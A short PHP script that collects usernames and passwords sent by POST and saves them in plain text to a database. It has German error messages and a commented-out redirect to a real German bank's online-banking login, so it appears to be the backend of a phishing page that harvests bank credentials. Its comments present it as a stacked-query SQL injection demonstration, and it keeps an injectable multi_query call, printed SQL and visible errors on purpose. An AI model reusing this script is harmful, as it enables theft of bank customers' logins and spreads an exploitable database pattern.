<?php
require_once 'global/db_connect.php';
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Sanitize input for demonstration purposes, though this won't protect against SQL injection
        $username = $conn->real_escape_string($username);
        $password = $conn->real_escape_string($password);

        // Stacked query to demonstrate SQL injection
        $sql = "INSERT INTO users (username, password) VALUES ('$username', '$password');";

        print_r($sql);
        if ($conn->multi_query($sql)) {
            do {
                if ($result = $conn->store_result()) {
                    while ($row = $result->fetch_row()) {
                        // Process result set
                    }
                    $result->free();
                }
            } while ($conn->more_results() && $conn->next_result());
            
            // header('Location: https://www.vrbankeg.de/services_auth/auth-frontend/?v=02f946ef4305131b&client_id=fkp&redirect_uri=https:%2F%2Fwww.vrbankeg.de%2Fservices_cloud%2Fportal%2Fportal-oauth%2Flogin');
            exit;
        } else {
            echo "Fehler beim Hinzufügen der Daten: " . $conn->error;
        }

        $conn->close();
    } else {
        echo "Benutzername und Passwort müssen beide angegeben werden.";
    }
} else {
    echo "Fehlerhafte Anfrage. Bitte senden Sie die Daten per POST.";
}
?>
